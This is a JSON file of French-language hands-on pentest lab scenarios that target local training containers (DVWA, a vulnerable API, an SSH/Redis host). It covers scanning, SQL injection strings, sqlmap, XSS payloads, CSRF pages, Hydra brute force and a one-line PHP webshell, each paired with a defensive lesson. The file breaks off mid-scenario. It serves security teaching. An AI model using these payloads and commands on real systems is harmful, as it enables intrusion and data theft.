{
  "scenarios": [
    {
      "id": "scenario-01-scan-reseau",
      "title": "Scénario 1 : Premier contact – Scan et découverte",
      "description": "Tu débarques sur un périmètre. Avant toute exploitation, il faut cartographier : quels hôtes ? quels ports ? quels services ? Ce scénario te fait pratiquer la phase de reconnaissance réseau avec nmap.",
      "difficulty": "Easy",
      "category": "network",
      "time": "20 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Ou make shell"
        },
        {
          "name": "Cible vuln-network",
          "url": "#",
          "note": "Depuis l'attaquant : ssh root@vuln-network"
        }
      ],
      "tasks": [
        {
          "title": "Connexion au conteneur attaquant",
          "content": "Ouvre un terminal sur ta machine. Lance : docker compose exec attaquant bash. Tu es maintenant « dans » la machine d’où tu vas lancer tes outils. Toutes les cibles du lab sont accessibles par leur nom (ex: vuln-network, dvwa).",
          "command": "docker compose exec attaquant bash",
          "tip": "Si le lab n’est pas démarré : docker compose up -d puis réessaie.",
          "learn": "En pentest, on travaille souvent depuis une « boîte attaquant » (VM ou conteneur) pour avoir les outils et un point de vue cohérent sur le réseau."
        },
        {
          "title": "Découverte des hôtes (optionnel en Docker)",
          "content": "En conditions réelles tu ferais un scan d’adresses (ex: nmap -sn 192.168.1.0/24). Ici les cibles ont des hostnames. Vérifie que tu atteins la cible : ping vuln-network.",
          "command": "ping -c 2 vuln-network",
          "tip": "Si ping ne répond pas, vérifie que le conteneur vuln-network est bien up (docker compose ps).",
          "learn": "La découverte peut être ICMP (ping), ARP, ou scan de ports. En lab Docker, les noms de service = noms d’hôtes."
        },
        {
          "title": "Scan des ports – découverte des services",
          "content": "Lance un scan des ports ouverts et des versions de services sur vuln-network. Tu dois identifier au moins les ports 22 (SSH) et 6379 (Redis).",
          "command": "nmap -sV vuln-network",
          "tip": "nmap -sC ajoute des scripts par défaut. -p- pour tous les ports (plus long).",
          "learn": "nmap -sV fait du « version detection » : il envoie des probes pour deviner le logiciel (OpenSSH, Redis, etc.). C’est la base de la recon réseau.",
          "docRef": "nmap-man"
        },
        {
          "title": "Noter les résultats",
          "content": "Note dans un fichier ou un rapport : IP/hostname, port, service, version. Exemple : vuln-network – 22/tcp OpenSSH, 6379/tcp Redis. Cette liste sera la base de ton plan d’exploitation.",
          "command": null,
          "tip": "En vrai pentest, on documente tout (screenshots, exports nmap -oN).",
          "learn": "La documentation en continu évite d’oublier des cibles et permet de justifier les conclusions dans le rapport."
        }
      ]
    },
    {
      "id": "scenario-02-sqli-dvwa",
      "title": "Scénario 2 : Compromission web – Injection SQL sur DVWA",
      "description": "Une application affiche des données selon un paramètre (ex: id=1). Si le serveur construit la requête SQL en concaténant ton entrée, tu peux « injecter » du SQL et lire toute la base. Ce scénario te guide pas à pas.",
      "difficulty": "Easy",
      "category": "web",
      "time": "25 min",
      "howto": "Tu utilises 2 choses : (1) DVWA dans le navigateur – bouton « Ouvrir DVWA (navigateur) » ci-dessous ; (2) le terminal attaquant – bouton Panneau ou PiP pour sqlmap à l'étape 4. Étapes 1 à 3 = dans l'onglet DVWA ; étape 4 = dans le terminal à droite.",
      "machines": [
        {
          "name": "DVWA",
          "urlKey": "dvwa",
          "note": "admin / password puis Create/Reset Database"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Panneau, PiP ou nouvel onglet – sqlmap, curl"
        }
      ],
      "tasks": [
        {
          "title": "1. Préparer DVWA (dans le navigateur)",
          "content": "Ouvre DVWA avec le bouton « Ouvrir DVWA (navigateur) » ci-dessus. Dans l'onglet : connecte-toi admin / password, clique « Create / Reset Database », puis menu « SQL Injection », niveau « Low ». Tout dans le navigateur, pas le terminal.",
          "command": null,
          "tip": "Low = aucune protection, pour apprendre. Medium/High ajoutent des filtres à contourner.",
          "learn": "Les niveaux de difficulté simulent des protections (échappement, requêtes préparées). En prod, il faut toujours des requêtes préparées."
        },
        {
          "title": "2. Comprendre la requête (dans DVWA)",
          "content": "Dans SQL Injection, entre 1 dans le champ et valide. Regarde l’URL : id=1. Le serveur fait sans doute une requête du type SELECT * FROM users WHERE id = '1'. Si tu mets 1' OR '1'='1, la condition devient toujours vraie.",
          "command": null,
          "tip": "En Low, tu peux modifier l’URL directement : ...?id=1' OR '1'='1&Submit=Submit",
          "learn": "L’injection SQL repose sur « casser » la syntaxe de la requête pour en ajouter une autre (UNION SELECT) ou modifier la logique (OR '1'='1')."
        },
        {
          "title": "3. Tester l'injection manuelle (dans DVWA)",
          "content": "Dans le champ, entre : 1' OR '1'='1 puis valide. Tu devrais voir plusieurs lignes (tous les users). Si ça ne marche pas, essaie 1' OR 1=1 -- (le -- commente la fin de la requête).",
          "command": null,
          "tip": "Les guillemets dépendent du code : parfois id='1' parfois id=1. Teste avec et sans guillemets.",
          "learn": "Chaque application est différente. Il faut tester plusieurs payloads (guillemets, commentaires --, #)."
        },
        {
          "title": "4. Automatiser avec sqlmap (dans le terminal attaquant)",
          "content": "Ouvre le terminal attaquant (bouton Panneau ou PiP ci-dessus). Dans ce terminal, lance sqlmap. Récupère le cookie (DevTools du navigateur sur l'onglet DVWA : Application > Cookies, PHPSESSID et security=low).",
          "command": "sqlmap -u 'http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx;security=low' --batch",
          "tip": "Remplace xxx par ton vrai PHPSESSID. --batch évite les questions interactives.",
          "learn": "sqlmap teste des centaines de payloads et peut dumper des tables. En audit, on documente la vuln manuelle puis on utilise l’outil pour extraire les données."
        }
      ]
    },
    {
      "id": "scenario-03-acces-ssh-redis",
      "title": "Scénario 3 : Accès réseau – Redis et SSH",
      "description": "Tu as trouvé Redis (port 6379) et SSH (22) sur vuln-network. Redis n’a pas de mot de passe : tu peux te connecter et lire la config. SSH accepte root avec un mot de passe faible. Objectif : obtenir un accès shell.",
      "difficulty": "Easy",
      "category": "network",
      "time": "15 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Ou make shell"
        },
        {
          "name": "vuln-network",
          "url": "#",
          "note": "Depuis l'attaquant : ssh root@vuln-network"
        }
      ],
      "tasks": [
        {
          "title": "Se connecter à Redis sans mot de passe",
          "content": "Depuis l’attaquant : redis-cli -h vuln-network. Aucune authentification n’est demandée. Tu es « dans » Redis.",
          "command": "redis-cli -h vuln-network",
          "tip": "Si redis-cli n’est pas trouvé, installe redis-tools (déjà dans l’image attaquant).",
          "learn": "Redis par défaut n’a pas de mot de passe. En prod, il faut requirepass et limiter l’écoute (bind)."
        },
        {
          "title": "Explorer Redis",
          "content": "Tape INFO pour voir les infos du serveur. Puis CONFIG GET dir pour voir le répertoire de travail. KEYS * pour lister les clés (peut être vide).",
          "command": "INFO\nCONFIG GET dir",
          "tip": "En exploitation avancée, on peut écrire une clé (ex: clé SSH) dans le répertoire autorisé pour prendre le contrôle du serveur.",
          "learn": "Un Redis exposé sans auth permet au minimum la lecture de la config et des données. C’est une vuln critique en production."
        },
        {
          "title": "Connexion SSH avec identifiants faibles",
          "content": "Quitte Redis (exit). Connecte-toi en SSH à vuln-network avec l’utilisateur root et le mot de passe labpassword.",
          "command": "ssh root@vuln-network",
          "tip": "Mot de passe : labpassword. Depuis ta machine hôte : ssh root@localhost -p 4222.",
          "learn": "Les mots de passe par défaut ou faibles sont encore très répandus. En pentest, on teste avec des wordlists (hydra, medusa)."
        },
        {
          "title": "Preuve d’accès",
          "content": "Une fois connecté en SSH, lance id ou whoami. Tu as un shell root sur la cible. C’est une « preuve d’accès » pour ton rapport.",
          "command": "id\nwhoami",
          "tip": "En vrai rapport, on joint un screenshot ou l’output de ces commandes.",
          "learn": "En pentest / Red Team, on documente chaque accès obtenu (niveau de privilège, méthode) pour le rapport final."
        }
      ]
    },
    {
      "id": "scenario-04-api-idor-sqli",
      "title": "Scénario 4 : API compromise – IDOR et SQLi",
      "description": "L’API vuln-api expose des endpoints sans contrôle d’accès (IDOR) et une injection SQL. Tu vas extraire des données utilisateurs et produits en suivant les étapes.",
      "difficulty": "Easy",
      "category": "api",
      "time": "20 min",
      "machines": [
        {
          "name": "vuln-api",
          "urlKey": "api",
          "note": "admin / admin123"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "curl, sqlmap"
        }
      ],
      "tasks": [
        {
          "title": "Obtenir un token (login)",
          "content": "L’API attend un POST /api/login avec login et password. Envoie une requête depuis l’attaquant avec curl. Tu reçois un « token » (factice dans cette API).",
          "command": "curl -s -X POST http://vuln-api:5000/api/login -H 'Content-Type: application/json' -d '{\"login\":\"admin\",\"password\":\"admin123\"}'",
          "tip": "Depuis ta machine : remplacer vuln-api par localhost.",
          "learn": "Les API REST utilisent souvent un token (JWT, session) après login. Si le token n’est pas vérifié côté serveur pour chaque ressource, on peut avoir des IDOR."
        },
        {
          "title": "IDOR – Accéder à tous les utilisateurs",
          "content": "L’endpoint GET /api/users/<id> retourne les infos de l’utilisateur id. Aucune vérification : tu peux appeler /api/users/1, /api/users/2, etc. Fais des requêtes pour user 1 et 2.",
          "command": "curl -s http://vuln-api:5000/api/users/1\ncurl -s http://vuln-api:5000/api/users/2",
          "tip": "IDOR = Insecure Direct Object Reference : on change l’id pour accéder à des objets d’autres utilisateurs.",
          "learn": "Chaque ressource doit être protégée : vérifier que l’utilisateur connecté a le droit d’accéder à cet id (ownership ou rôle)."
        },
        {
          "title": "SQLi sur /api/products",
          "content": "GET /api/products?q= recherche des produits par nom. Le paramètre q est concaténé dans une requête SQL. Teste avec q=' OR '1'='1 pour tout récupérer.",
          "command": "curl -s \"http://vuln-api:5000/api/products?q=' OR '1'='1\"",
          "tip": "Tu peux aussi utiliser sqlmap : sqlmap -u 'http://vuln-api:5000/api/products?q=1' --batch",
          "learn": "Les API sont autant vulnérables que les apps web (SQLi, XSS, IDOR). OWASP API Security Top 10 recense les risques."
        }
      ]
    },
    {
      "id": "scenario-05-xss-dvwa",
      "title": "Scénario 5 : Vol de session – XSS sur DVWA",
      "description": "Une XSS (Cross-Site Scripting) permet d’exécuter du JavaScript dans le navigateur de la victime. En réfléchi, l’attaquant envoie un lien ; en stocké, le script est sauvegardé et vu par tous. Tu vas tester les deux sur DVWA.",
      "difficulty": "Easy",
      "category": "web",
      "time": "20 min",
      "machines": [
        {
          "name": "DVWA",
          "urlKey": "dvwa",
          "note": "admin / password"
        }
      ],
      "tasks": [
        {
          "title": "XSS réfléchie – Premier test",
          "content": "Dans DVWA, va dans « XSS (Reflected) », niveau Low. Dans le champ, entre : <script>alert(1)</script> et valide. Une alerte s’affiche : le serveur a renvoyé ton script sans l’échapper.",
          "command": null,
          "tip": "En Medium/High, des filtres sont appliqués (balises supprimées, events comme onerror). Il faut contourner (ex: <img src=x onerror=alert(1)>).",
          "learn": "XSS = le serveur renvoie des données utilisateur dans la page sans les échapper. Le navigateur exécute le JavaScript. Protection : échapper HTML (encode) côté sortie."
        },
        {
          "title": "XSS stockée – Script visible par tous",
          "content": "Va dans « XSS (Stored) », niveau Low. Entre un nom et un message contenant <script>alert('XSS')</script>. Valide. Recharge la page ou ouvre-la dans un autre onglet : l’alerte se déclenche à chaque visite.",
          "command": null,
          "tip": "En stocké, le script est en base : tous les visiteurs l’exécutent. C’est plus dangereux que la réfléchie (pas besoin d’envoyer un lien à chaque victime).",
          "learn": "Stored XSS = persistant. Utilisé pour vol de cookies (document.cookie), keylogging, redirection. Toujours valider et échapper les entrées côté serveur."
        }
      ]
    },
    {
      "id": "scenario-06-stego-flag",
      "title": "Scénario 6 : Stéganographie – Extraire un flag",
      "description": "Une image peut cacher un fichier (steghide) ou des données dans les bits (LSB). Tu vas télécharger l’image de défi depuis la plateforme, la copier dans le conteneur attaquant, et extraire le flag avec steghide.",
      "difficulty": "Easy",
      "category": "stego",
      "time": "15 min",
      "machines": [
        {
          "name": "Télécharger l’image",
          "url": "/challenges/stego/image_stego.jpg",
          "note": "Sur la plateforme : Défis stégano"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "steghide, exiftool, binwalk"
        }
      ],
      "tasks": [
        {
          "title": "Télécharger et placer l’image",
          "content": "Depuis le terminal web (ou make shell), récupère l'image directement : wget http://gateway/challenges/stego/image_stego.jpg -O /workspace/image_stego.jpg. La plateforme est joignable à l'hôte gateway depuis le conteneur. Sinon télécharge l'image sur la plateforme puis docker cp vers lab-attaquant:/workspace/.",
          "command": "wget http://gateway/challenges/stego/image_stego.jpg -O /workspace/image_stego.jpg",
          "tip": "Ou monte un volume entre l’hôte et l’attaquant pour partager des fichiers.",
          "learn": "En CTF et forensique, on reçoit souvent des fichiers à analyser. Les placer dans un répertoire commun (ex: /workspace) permet d’utiliser les outils du conteneur."
        },
        {
          "title": "Vérifier le type et les métadonnées",
          "content": "Dans l’attaquant : file /workspace/image_stego.jpg et exiftool /workspace/image_stego.jpg. Habitude à prendre avant d’attaquer avec steghide.",
          "command": "file /workspace/image_stego.jpg\nexiftool /workspace/image_stego.jpg",
          "tip": "Parfois le flag ou un indice est dans les métadonnées (commentaire EXIF).",
          "learn": "file donne le type réel ; exiftool les métadonnées. Souvent suffisant pour trouver un indice ou confirmer qu’il y a du steghide."
        },
        {
          "title": "Extraire avec steghide",
          "content": "steghide info /workspace/image_stego.jpg pour voir s’il y a des données. Puis steghide extract -sf /workspace/image_stego.jpg. Quand on te demande le mot de passe, entre : labstego.",
          "command": "steghide extract -sf /workspace/image_stego.jpg",
          "tip": "Mot de passe du défi : labstego. Un fichier est extrait dans le répertoire courant (souvent le nom du fichier embarqué).",
          "learn": "steghide cache des données dans des images JPEG/BMP. Sans mot de passe on peut tenter du brute-force (stegseek avec rockyou)."
        }
      ]
    },
    {
      "id": "scenario-07-crypto-base64-aes",
      "title": "Scénario 7 : Cryptographie – Base64 et AES",
      "description": "Tu reçois deux fichiers : un flag encodé en Base64 et un fichier chiffré avec OpenSSL (AES). Tu vas les télécharger, les décoder/déchiffrer et récupérer les flags.",
      "difficulty": "Easy",
      "category": "crypto",
      "time": "15 min",
      "machines": [
        {
          "name": "Défis crypto",
          "url": "/challenges/crypto/",
          "note": "flag_b64.txt et flag.enc"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "base64, openssl"
        }
      ],
      "tasks": [
        {
          "title": "Décoder le Base64",
          "content": "Depuis le terminal attaquant : wget http://gateway/challenges/crypto/flag_b64.txt -O /workspace/flag_b64.txt && wget http://gateway/challenges/crypto/flag.enc -O /workspace/flag.enc. Puis cd /workspace && base64 -d flag_b64.txt pour le premier flag.",
          "command": "wget http://gateway/challenges/crypto/flag_b64.txt -O /workspace/flag_b64.txt && wget http://gateway/challenges/crypto/flag.enc -O /workspace/flag.enc && cd /workspace && base64 -d flag_b64.txt",
          "tip": "Base64 n’est pas du chiffrement : c’est un encodage réversible sans clé. Très courant dans les CTF et les payloads.",
          "learn": "Reconnaître Base64 : alphabet A-Za-z0-9+/ et souvent = en padding. Toujours identifier le type (file, tête de fichier) avant d’attaquer."
        },
        {
          "title": "Déchiffrer le fichier OpenSSL",
          "content": "Dans /workspace : openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k labcrypto. Mot de passe du défi : labcrypto.",
          "command": "cd /workspace && openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k labcrypto && cat flag.txt",
          "tip": "L’option -k labcrypto évite la demande interactive. En CTF si le mot de passe est inconnu, on utilise des wordlists.",
          "learn": "OpenSSL enc permet du chiffrement symétrique (AES, etc.). En prod, la gestion des clés est critique ; un mot de passe faible = vulnérabilité."
        }
      ]
    },
    {
      "id": "scenario-08-red-team-1h",
      "title": "Scénario 8 : Red Team en 1h – Du scan au rapport",
      "description": "Scénario complet : tu as 1h pour cartographier le lab, exploiter au moins une vulnérabilité (web, réseau ou API), et produire une note avec preuves. Pas de solution détaillée : tu appliques ce que tu as vu dans les autres scénarios.",
      "difficulty": "Medium",
      "category": "red",
      "time": "60 min",
      "machines": [
        {
          "name": "Toutes les cibles",
          "url": "#",
          "note": "Utiliser les rooms par catégorie (liens ci-dessus)"
        }
      ],
      "tasks": [
        {
          "title": "Cartographie (15 min)",
          "content": "Depuis l’attaquant, scanne dvwa, juice-shop, bwapp, vuln-api, vuln-network avec nmap -sV. Note pour chaque cible : ports, services. Complète avec nikto sur les cibles web si tu veux.",
          "command": "nmap -sV dvwa\nnmap -sV vuln-network\nnmap -sV vuln-api",
          "tip": "Priorise les services que tu connais (80/443, 22, 6379, 5000).",
          "learn": "La recon est la base. Un bon rapport commence par une cartographie claire."
        },
        {
          "title": "Exploitation (30 min)",
          "content": "Choisis au moins une cible et une vuln (SQLi DVWA, SSH vuln-network, IDOR vuln-api, Redis vuln-network…). Exploite-la et obtiens soit des données (dump, liste users) soit un accès (shell SSH). Documente chaque commande et le résultat.",
          "command": null,
          "tip": "Reviens aux scénarios 2, 3, 4 si tu bloques. L’objectif est de faire une chaîne complète toi-même.",
          "learn": "En Red Team, on enchaîne recon → exploitation → post-exploitation. Ici on s’arrête à la preuve d’accès ou à l’extraction de données."
        },
        {
          "title": "Rédaction (15 min)",
          "content": "Rédige une note d’une page : Titre, Contexte, Méthode (recon + exploitation), Vulnérabilités trouvées, Preuves (copier-coller d’output ou décrire), Recommandations (une par vuln).",
          "command": null,
          "tip": "Structure type : Résumé exécutif / Méthodologie / Résultats / Annexes (screenshots).",
          "learn": "Le livrable d’un pentest ou Red Team est le rapport. Clarté et preuves sont indispensables."
        }
      ]
    },
    {
      "id": "scenario-09-phishing-analyse",
      "title": "Scénario 9 : Phishing – Analyser une page suspecte",
      "description": "Tu apprends à reconnaître une page de type phishing (fausse connexion). La plateforme propose une page de démo. Tu identifies les indices qui trahissent une tentative de phishing.",
      "difficulty": "Easy",
      "category": "phishing",
      "time": "15 min",
      "machines": [
        {
          "name": "Page de démo phishing",
          "url": "/demo-phishing.html",
          "note": "Exemple pédagogique sur cette plateforme"
        }
      ],
      "tasks": [
        {
          "title": "Ouvrir la page de démo",
          "content": "Clique sur le lien « Page de démo phishing » (ou va sur http://localhost:8080/demo-phishing.html). Tu vois une page qui ressemble à une connexion. En conditions réelles, il n’y aurait pas de bannière rouge.",
          "command": null,
          "tip": "La bannière rouge est là pour rappeler que c’est un exercice. En vrai, la page serait identique visuellement à un vrai site.",
          "learn": "Les pages de phishing imitent des sites légitimes (banque, messagerie). La différence se voit dans l’URL et le certificat."
        },
        {
          "title": "Vérifier l’URL et le certificat",
          "content": "Regarde la barre d’adresse : tu es sur localhost:8080. Un vrai site de banque aurait un domaine du type www.ma-banque.fr et un cadenas HTTPS valide. Clique sur le cadenas (si présent) pour voir le certificat : il doit correspondre au domaine.",
          "command": null,
          "tip": "En phishing réel, l’URL peut être banque-securise.xyz ou un sous-domaine trompeur. Toujours vérifier avant de saisir un mot de passe.",
          "learn": "Ne jamais cliquer sur un lien de connexion reçu par email : aller sur le site en tapant l’URL ou via un favori."
        }
      ]
    },
    {
      "id": "scenario-10-forensics-tshark",
      "title": "Scénario 10 : Forensique – Capturer et filtrer du trafic",
      "description": "Tu captures du trafic depuis le conteneur attaquant avec tcpdump, puis tu l’analyses avec tshark pour extraire des requêtes HTTP et identifier des comportements (scan, connexions).",
      "difficulty": "Medium",
      "category": "forensics",
      "time": "25 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "tcpdump, tshark"
        }
      ],
      "tasks": [
        {
          "title": "Lancer une capture en arrière-plan",
          "content": "Dans l’attaquant : tcpdump -i eth0 -w /workspace/capture.pcap. Dans un autre terminal (une autre session exec), lance des requêtes : curl http://dvwa, nmap -sV vuln-network. Puis arrête la capture (Ctrl+C dans le premier terminal).",
          "command": "tcpdump -i eth0 -w /workspace/capture.pcap",
          "tip": "Limite la durée avec -G 30 -W 1 pour 30 secondes max, ou arrête à la main après quelques requêtes.",
          "learn": "La capture de trafic est la base de l’analyse forensique réseau. On enregistre tout puis on filtre ensuite."
        },
        {
          "title": "Filtrer les requêtes HTTP avec tshark",
          "content": "tshark -r /workspace/capture.pcap -Y 'http' -T fields -e frame.number -e ip.src -e ip.dst -e http.request.uri. Tu vois les requêtes HTTP avec source, destination et URI.",
          "command": "tshark -r /workspace/capture.pcap -Y 'http' -T fields -e ip.src -e ip.dst -e http.request.uri",
          "tip": "Sans -T fields tu as plus de détails. -Y 'tcp.flags.syn==1' pour les nouvelles connexions TCP.",
          "learn": "tshark = Wireshark en ligne de commande. Les filtres (-Y) permettent de cibler du HTTP, du DNS, des scans, etc."
        }
      ]
    },
    {
      "id": "scenario-11-csrf-dvwa",
      "title": "Scénario 11 : CSRF – Falsification de requête cross-site (DVWA)",
      "description": "Une attaque CSRF force le navigateur d’une victime connectée à envoyer une requête non désirée à un site. Tu vas reproduire un changement de mot de passe via CSRF sur DVWA.",
      "difficulty": "Easy",
      "category": "web",
      "time": "20 min",
      "machines": [
        {
          "name": "DVWA",
          "urlKey": "dvwa",
          "note": "admin / password"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Pour héberger une page malveillante"
        }
      ],
      "tasks": [
        {
          "title": "Préparer DVWA",
          "content": "Connecte-toi à DVWA, va dans « CSRF », niveau Low. Tu vois un formulaire de changement de mot de passe.",
          "command": null,
          "tip": "Le token CSRF en Low est prévisible ou absent.",
          "learn": "CSRF = l’attaquant profite de la session de la victime pour exécuter des actions à son insu."
        },
        {
          "title": "Analyser la requête",
          "content": "Change le mot de passe et observe la requête (URL ou DevTools). Note les paramètres (password_new, password_conf, etc.).",
          "command": null,
          "tip": "En Low, l’URL peut être rejouée telle quelle.",
          "learn": "Sans token imprévisible, toute requête valide peut être forgée depuis un autre site."
        },
        {
          "title": "Créer une page piège",
          "content": "Crée une page HTML qui contient un formulaire ou un lien pointant vers l’URL de changement de mot de passe avec les paramètres choisis. Ouvre-la (ou envoie le lien à une « victime » connectée).",
          "command": null,
          "tip": "Tu peux utiliser un formulaire auto-submit avec JavaScript.",
          "learn": "Les défenses : token CSRF, SameSite sur les cookies, vérification Referer/Origin."
        }
      ]
    },
    {
      "id": "scenario-12-file-upload-dvwa",
      "title": "Scénario 12 : Upload de fichier malveillant (DVWA)",
      "description": "Si une application permet d’uploader des fichiers sans valider le type ou le contenu, on peut parfois uploader un webshell et exécuter du code sur le serveur.",
      "difficulty": "Easy",
      "category": "web",
      "time": "25 min",
      "machines": [
        {
          "name": "DVWA",
          "urlKey": "dvwa",
          "note": "admin / password, Create/Reset DB"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Pour créer le fichier PHP"
        }
      ],
      "tasks": [
        {
          "title": "Accéder au module File Upload",
          "content": "Dans DVWA, va dans « File Upload », niveau Low. Tu peux uploader une image.",
          "command": null,
          "tip": "En Low, l’extension .php peut être acceptée.",
          "learn": "La validation doit porter sur le type MIME, l’extension, et idéalement le contenu (magic bytes)."
        },
        {
          "title": "Préparer un webshell",
          "content": "Crée un fichier shell.php contenant <?php system($_GET['cmd']); ?> (ou équivalent). Depuis l’attaquant : echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php.",
          "command": "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
          "tip": "En lab, on utilise des commandes simples pour la preuve (id, whoami).",
          "learn": "Un webshell donne un accès en ligne de commande via le navigateur."
        },
        {
          "title": "Uploader et exécuter",
          "content": "Upload shell.php (renomme en .jpg si besoin pour contourner en Medium). Accède à l’URL du fichier uploadé avec ?cmd=id pour exécuter une commande.",
          "command": null,
          "tip": "Le chemin d’upload est souvent /hackable/uploads/ ou indiqué après upload.",
          "learn": "Toujours stocker les uploads hors de la racine web ou avec des noms imprévisibles."
        }
      ]
    },
    {
      "id": "scenario-13-hydra-ssh",
      "title": "Scénario 13 : Brute force SSH avec Hydra",
      "description": "Tu as trouvé le port SSH ouvert sur vuln-network. Tu vas utiliser Hydra pour tester des combinaisons login/mot de passe et obtenir un accès.",
      "difficulty": "Easy",
      "category": "network",
      "time": "20 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "hydra installé"
        },
        {
          "name": "vuln-network",
          "url": "#",
          "note": "ssh root@vuln-network"
        }
      ],
      "tasks": [
        {
          "title": "Vérifier l’accès SSH",
          "content": "Depuis l’attaquant : nmap -p 22 vuln-network pour confirmer que le port 22 est ouvert.",
          "command": "nmap -p 22 vuln-network",
          "tip": "Le mot de passe du lab est labpassword ; pour l’exercice tu peux utiliser une petite wordlist.",
          "learn": "Hydra automatise les tentatives de connexion (SSH, HTTP, FTP, etc.)."
        },
        {
          "title": "Créer une petite wordlist",
          "content": "Crée un fichier passwords.txt avec quelques mots de passe (dont labpassword). Ex : echo -e 'labpassword\nadmin\nroot\npassword' > passwords.txt",
          "command": "echo -e 'labpassword\\nadmin\\nroot' > /workspace/passwords.txt",
          "tip": "En pentest réel on utilise rockyou.txt ou des listes ciblées.",
          "learn": "Une wordlist de qualité augmente les chances sans exploser le nombre de tentatives."
        },
        {
          "title": "Lancer Hydra",
          "content": "hydra -l root -P passwords.txt ssh://vuln-network -t 4. Une fois le mot de passe trouvé, connecte-toi en SSH pour confirmer.",
          "command": "hydra -l root -P passwords.txt ssh://vuln-network -t 4",
          "tip": "-t 4 = 4 tâches parallèles. Adapte selon la cible.",
          "learn": "Limiter le débit et utiliser des listes raisonnables pour éviter le blocage et les abus."
        }
      ]
    },
    {
      "id": "scenario-14-nikto-scan",
      "title": "Scénario 14 : Scan de vulnérabilités web avec Nikto",
      "description": "Nikto scanne un serveur web pour détecter des fichiers sensibles, des versions vulnérables et des misconfigurations. Tu l’utilises sur une cible du lab.",
      "difficulty": "Easy",
      "category": "web",
      "time": "15 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "nikto"
        },
        {
          "name": "DVWA ou autre",
          "urlKey": "dvwa",
          "note": "Cible web"
        }
      ],
      "tasks": [
        {
          "title": "Lancer Nikto sur une cible",
          "content": "Depuis l’attaquant : nikto -h http://dvwa. Tu peux remplacer dvwa par juice-shop ou bwapp (même réseau).",
          "command": "nikto -h http://dvwa",
          "tip": "Nikto teste des milliers d’URLs et en-têtes. La sortie peut être longue.",
          "learn": "Nikto est un scanner générique ; il faut trier les vrais positifs des faux positifs."
        },
        {
          "title": "Interpréter les résultats",
          "content": "Repère les lignes « + » (trouvées) : répertoires sensibles, versions, options dangereuses. Note ce qui pourrait être exploitable (ex: /phpmyadmin, /admin).",
          "command": null,
          "tip": "Export avec -o pour garder un rapport : nikto -h http://dvwa -o report.html",
          "learn": "Un bon rapport de scan cite les preuves et les recommandations par finding."
        }
      ]
    },
    {
      "id": "scenario-15-theharvester-osint",
      "title": "Scénario 15 : OSINT – Collecte d’infos avec theHarvester",
      "description": "En phase de reconnaissance, on collecte des informations sur une cible (emails, sous-domaines, hôtes) depuis des moteurs de recherche et des API. theHarvester automatise une partie de cette collecte.",
      "difficulty": "Easy",
      "category": "osint",
      "time": "20 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "theHarvester (pip)"
        }
      ],
      "tasks": [
        {
          "title": "Lancer theHarvester",
          "content": "theHarvester -d example.com -b bing (ou -b google, duckduckgo). -d = domaine cible. En lab tu peux utiliser un domaine public.",
          "command": "theHarvester -d example.com -b bing",
          "tip": "Certaines sources nécessitent des clés API. Bing/DuckDuckGo fonctionnent souvent sans.",
          "learn": "OSINT = Open Source Intelligence : tout ce qui est public peut servir à préparer une attaque."
        },
        {
          "title": "Exploiter les résultats",
          "content": "Note les emails, sous-domaines et IPs trouvés. Ces infos servent au phishing, à l’énumération ou au ciblage de services.",
          "command": null,
          "tip": "Export en JSON avec -f resultat.json pour réutiliser les données.",
          "learn": "La phase OSINT est cruciale : plus tu en sais sur la cible, plus tes attaques sont ciblées."
        }
      ]
    },
    {
      "id": "scenario-16-gobuster-dir",
      "title": "Scénario 16 : Découverte de répertoires avec Gobuster",
      "description": "Les applications web exposent parfois des répertoires cachés (admin, backup, .git). Gobuster (ou dirb) teste une wordlist d’URLs pour les découvrir.",
      "difficulty": "Easy",
      "category": "web",
      "time": "20 min",
      "machines": [
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "gobuster"
        },
        {
          "name": "DVWA ou vuln-api",
          "urlKey": "dvwa",
          "note": "Cible"
        }
      ],
      "tasks": [
        {
          "title": "Installer / lancer Gobuster",
          "content": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20. -u = URL de base, -w = wordlist, -t = threads.",
          "command": "gobuster dir -u http://dvwa -w /usr/share/wordlists/dirb/common.txt -t 20",
          "tip": "Si dirb/common.txt n’existe pas, utilise une petite wordlist (ex: admin, login, backup).",
          "learn": "La découverte de répertoires révèle des panneaux d’admin, des backups ou des fichiers de config."
        },
        {
          "title": "Analyser les réponses",
          "content": "Gobuster affiche les codes HTTP (200, 301, 403). Les 200/301 indiquent des chemins existants. Visite-les dans le navigateur pour voir le contenu.",
          "command": null,
          "tip": "Filtre les tailles de réponse avec -b pour ignorer les 404 de même taille.",
          "learn": "En pentest, on documente chaque endpoint découvert pour la suite du test."
        }
      ]
    },
    {
      "id": "scenario-17-command-injection",
      "title": "Scénario 17 : Injection de commandes (DVWA)",
      "description": "Si une application passe une entrée utilisateur à une fonction système (ex: ping, exec), une injection de commandes peut permettre d’exécuter des commandes arbitraires sur le serveur.",
      "difficulty": "Easy",
      "category": "web",
      "time": "20 min",
      "machines": [
        {
          "name": "DVWA",
          "urlKey": "dvwa",
          "note": "Command Injection, niveau Low"
        },
        {
          "name": "Terminal attaquant",
          "urlKey": "terminal",
          "note": "Pour comprendre les payloads"
        }
      ],
      "tasks": [
        {
          "title": "Accéder au module",
